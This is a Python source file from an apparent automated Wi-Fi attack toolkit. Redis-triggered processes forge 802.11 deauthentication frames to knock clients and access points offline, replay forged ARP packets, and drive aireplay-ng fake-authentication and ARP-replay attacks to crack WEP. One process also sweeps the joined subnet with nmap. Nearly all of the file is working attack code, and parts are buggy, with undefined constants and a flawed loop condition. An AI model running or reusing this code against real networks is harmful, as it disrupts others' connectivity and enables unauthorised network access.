import os
import json
import logging
from time import sleep
from tempfile import NamedTemporaryFile
from multiprocessing import Process
from netaddr import IPNetwork

import requests
from redis import StrictRedis
from netifaces import ifaddresses
from scapy.sendrecv import sendp
from scapy.all import (
    Dot11,
    Dot11WEP,
    LLC,
    SNAP,
    ARP,
    Dot11Deauth,
    RadioTap,
)
from pyrcrack.replaying import Aireplay
from lcubo_helpers import load_json, pushqueue_json
from wifi_tools.events import change_channel_signal
from wifi_tools.settings import (
    RESULTS_DIRECTORY,
    ATTACK_THRESHOLD,
    AIREPLAY_LOG,
    AIREPLAY_ERROR_LOG,
)
logger = logging.getLogger(__name__)


class CustomAttack(Process):
    """
        Base Class for attack methods that are triggered by subscription
    """

    def __init__(self, iface, max_channel=11):
        super(CustomAttack, self).__init__()
        self.iface = iface
        self.max_channel = max_channel
        self.channel = None
        self.attack_chanel = 0

    def _process_startup(self):
        self.redis_server = StrictRedis("localhost")

        self.pubsub = self.redis_server.pubsub()
        self.pubsub.subscribe(self.subscribe_channel)

    def run(self):
        self._process_startup()
        try:
            while True:
                for item in self.pubsub.listen():
                    if item['data'] == 1:
                        continue

                    logger.debug('Signal received on {0}. launching ...'.format(self.__class__.__name__))
                    try:
                        self.tick(json.loads(item['data'].decode('utf8')))
                    except Exception as ex:
                        logger.exception(ex)
        except KeyboardInterrupt:
            logger.info('User sent keyboard interrupt. Stopping process')

    def tick(self):
        raise NotImplementedError()


class DeauthAttack(CustomAttack):

    def __init__(self, iface, max_channel=11):
        self.iface = iface
        self.max_channel = max_channel
        super(DeauthAttack, self).__init__(iface, max_channel)
        self.channel = None
        self.attack_chanel = 0
        self.timeinterval = None
        self.packets = None
        self.subscribe_channel = 'client_found'

    def tick(self, data):
        '''
        addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway if there's
        multi-APs to one gateway. Constantly scans the clients_APs list and
        starts a thread to deauth each instance
        '''
        current_channel = self.redis_server.get('current_channel')
        logger.debug('Current channel {0}. Attack signal channel {1}'.format(current_channel, data['channel']))
        if data['channel'] == current_channel:
            logger.info('Sending attacks on channel {0} using interface {1}'.format(current_channel, self.iface))
            pkts = self.attack_clients(data)
            self.send_packets(pkts)
            pkts = self.attack_access_points(data)
            self.send_packets(pkts)

    def attack_clients(self, data):
        pkts = []
        access_point_bssid = data['bssid']
        clients = self.redis_server.smembers('clients_{0}'.format(access_point_bssid))
        access_point = load_json(self.redis_server, 'access_point_{0}'.format(access_point_bssid))
        access_point and logger.debug('Got {0} clients for access point {1} ({2})'.format(len(clients), access_point['ssid'], access_point_bssid))
        # Can't add a RadioTap() layer as the first layer or it's a malformed
        # Association request packet?
        # Append the packets to a new list so we don't have to hog the lock
        # type=0, subtype=12?
        for client_addr in clients:
            logger.debug('Creating packet to deauth client {0}'.format(client_addr))
            logger.debug('destination {0} source {1} bssid {2}'.format(client_addr, access_point_bssid, access_point_bssid))
            deauth_pkt1 = RadioTap() / Dot11(addr1=client_addr, addr2=access_point_bssid, addr3=access_point_bssid, type=0, subtype=12) / Dot11Deauth(reason=7)
            logger.debug('destination {0} source {1} bssid {2}'.format(access_point_bssid, client_addr, access_point_bssid))
            deauth_pkt2 = RadioTap() / Dot11(addr1=access_point_bssid, addr2=client_addr, addr3=access_point_bssid, type=0, subtype=12) / Dot11Deauth(reason=7)
            pkts.append(deauth_pkt1)
            pkts.append(deauth_pkt2)
        return pkts

    def attack_access_points(self, data):
        pkts = []
        access_point_bssid = data['bssid']
        logger.debug('Creating packet to deauth AP {0}'.format(access_point_bssid))
        logger.debug('destination {0} source {1} bssid {2}'.format('ff:ff:ff:ff:ff:ff', access_point_bssid, access_point_bssid))
        deauth_ap = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=access_point_bssid, addr3=access_point_bssid, type=0, subtype=12) / Dot11Deauth(reason=7)
        pkts.append(deauth_ap)
        return pkts

    def send_packets(self, pkts):
        if len(pkts) > 0:
            logging.debug('Sending {0} deauth packets on interface {1}'.format(len(pkts), self.iface))
            # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI
            if not self.timeinterval:
                self.timeinterval = 0
            if not self.packets:
                self.packets = 1

            for packet in pkts:
                logger.debug('Sending packet on interface {0}...'.format(self.iface))
                sendp(packet, inter=float(self.timeinterval), count=int(self.packets), iface=self.iface, verbose=False)


class TargetAttack(CustomAttack):

    def __init__(self, iface, max_channel=11):
        super(TargetAttack, self).__init__(iface, max_channel)
        self.subscribe_channel = 'target_found'

    def tick(self, data):
        access_point = load_json(self.redis_server, 'access_point_{0}'.format(data['bssid']))
        ap_channel = access_point['channel']
        logger.info('Target {0} found. force channel {1}'.format(data, ap_channel))
        self.redis_server.set('force_channel_{0}'.format(self.iface), ap_channel)
        self.redis_server.set('force_access_point_{0}'.format(self.iface), data['bssid'])

        # pass

        self.redis_server.delete('force_channel_{0}'.format(self.iface))
        self.redis_server.delete('force_access_point_{0}'.format(self.iface))


class WEPAttack(CustomAttack):

    def __init__(self, iface, max_channel=11):
        super(WEPAttack, self).__init__(iface, max_channel)
        self.subscribe_channel = 'wep_found'

    def tick(self, data):
        self.arp_request_replay(data)

    def fake_auth(self):
        pass

    def arp_request_replay(self, data):
        """
             listens for an ARP packet then retransmits it back to the access point
        """
        logger.info('Detected WEP ARP request. Flooding with responses')
        arp_answer = RadioTap() / Dot11(
            type="Data",
            FCfield="from-DS",
            addr1=data['addr1'],
            addr2=data['bssid'],
            addr3=data['bssid'])
        arp_answer.FCfield |= 0x40
        arp_answer /= Dot11WEP(
            iv="111",
            keyid=KEYID)
        arp_answer /= LLC(ctrl=3) / SNAP() / ARP(
            op="is-at",
            hwsrc=HWSRC,
            psrc=arp_answer.getlayer(ARP).pdst,
            hwdst=arp_answer.getlayer(ARP).hwsrc,
            pdst=arp_answer.getlayer(ARP).psrc)
        arp_answer /= arp_answer.getlayer(ARP).payload
        sendp(arp_answer, verbose=0)


class AuthenticationAttack(CustomAttack):
    """
        Also used for Open networks
    """

    def __init__(self, iface, max_channel=11):
        super(AuthenticationAttack, self).__init__(iface, max_channel)
        self.subscribe_channel = 'scan'

    def _prepare_output_filename(self, prefix, extension):
        directory = os.path.join(RESULTS_DIRECTORY, self.access_point['bssid'])
        if not os.path.exists(directory):
            os.makedirs(directory)

        return '{0}_{1}.{2}'.format(prefix, self.access_datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S"), extension)

    def tick(self, bssid):
        iface_ip = ifaddresses(self.iface)[2][0]['addr']
        ips_range = '{0}/24'.format(iface_ip)
        ips = IPNetwork(ips_range)
        logger.info('Starting to scan ips {0}'.format(ips_range))
        destination_key = '{0}_nmap_result'.format(bssid)
        for ip in ips:
            pushqueue_json({
                'name': 'nmap_scan',
                'destination_key': destination_key,
                'parameters': {
                    'targets': ips,
                    'options': '-sP'
                }
            })
        # TODO: this is async. need fix
        for address, services in load_json(self.redis_server, 'access_point_network_{0}').items():
            for service in services:
                if service['port'] == 80:
                    filename = self.prepare_output_filename(bssid, 'html')
                    with open(filename, 'wb') as output:
                        output.write(requests.get('http://{0}'.format(address)))

        logger.info('Scan')
        self.redis_server.set('pause_generic', 0)


class AireplayAttack(CustomAttack):

    def _process_startup(self):
        self.subscribe_channel = 'client_found'
        super(AireplayAttack, self)._process_startup()
        self.number_of_attacks = 0
        self.attacks = []

    def tick(self, data):
        bssid = data['bssid']
        client_address = data['client_addr']
        current_channel = int(self.redis_server.get('current_channel_{0}'.format(self.iface)))
        if int(data['channel']) != current_channel:
            logger.debug('AP not in channel {0}, skipping'.format(current_channel))
            return
        logger.info('Starting aireplay deauth')
        stdout_file = open(AIREPLAY_LOG, 'a')
        stderr_file = open(AIREPLAY_ERROR_LOG, 'a')
        aireplay_deauth = Aireplay(attack='deauth', interface=self.iface, c=client_address, a=bssid, stdout=stdout_file, stderr=stderr_file)
        aireplay_deauth.start()
        self.attacks.append(aireplay_deauth)
        aireplay_deauth = Aireplay(attack='deauth', interface=self.iface, a=bssid, stdout=stdout_file, stderr=stderr_file)
        aireplay_deauth.start()
        self.attacks.append(aireplay_deauth)
        self.number_of_attacks += 1
        logger.info('Numer of attacks {0}'.format(self.number_of_attacks))
        if self.number_of_attacks == ATTACK_THRESHOLD:
            logger.info('Change channel event')
            self.number_of_attacks = 0
            # when finish let the others know that we have to change the channel
            for attack in self.attacks:
                attack.stop()
            change_channel_signal.set()
            change_channel_signal.clear()


class AireplayWEPAttack(CustomAttack):

    def _process_startup(self):
        self.subscribe_channel = 'wep_found'
        super(AireplayWEPAttack, self)._process_startup()
        self.number_of_attacks = 0

    def tick(self, data):
        bssid = data['bssid'].lower()
        current_channel = int(self.redis_server.get('current_channel_{0}'.format(self.iface)))
        if int(data['channel']) != current_channel:
            # logger.info('AP in channel {0} current channel is {1}, skipping'.format(data['channel'], current_channel))
            return
        logger.info('Starting aireplay deauth')
        clients = self.redis_server.smembers('clients_{0}'.format(bssid))
        fakeauths = []
        aireplay_arpreplay = None
        for client_address in clients:
            stdout_file = NamedTemporaryFile()
            stderr_file = open(AIREPLAY_ERROR_LOG, 'a')
            aireplay_fakeauth = Aireplay(attack='fakeauth', interface=self.iface, h=client_address, a=bssid, stdout=stdout_file, stderr=stderr_file)
            aireplay_fakeauth.start()
            fakeauths.append(aireplay_fakeauth)
            sleep(1)
            stdout_file.seek(0)
            output = stdout_file.read()
            logger.info(output)
            if 'Association successful :-)' in str(output):
                logger.info('Association successful :-)')
                aireplay_arpreplay = Aireplay(attack='arpreplay', interface=self.iface, h=client_address, a=bssid, stdout=stdout_file, stderr=stderr_file)
                aireplay_arpreplay.start()
                packets = self.redis_server.get('client_packets_{0}'.format(client_address)) or 0
                limit = 0
                while packets < 100 or limit <= 1000:
                    logger.info('Generated {0} packets'.format(packets))
                    packets = self.redis_server.get('client_packets_{0}'.format(client_address))
                    limit += 1
        for fakeauth in fakeauths:
            fakeauth.stop()
        if aireplay_arpreplay:
            aireplay_arpreplay.stop()
        change_channel_signal.set()
        change_channel_signal.clear()
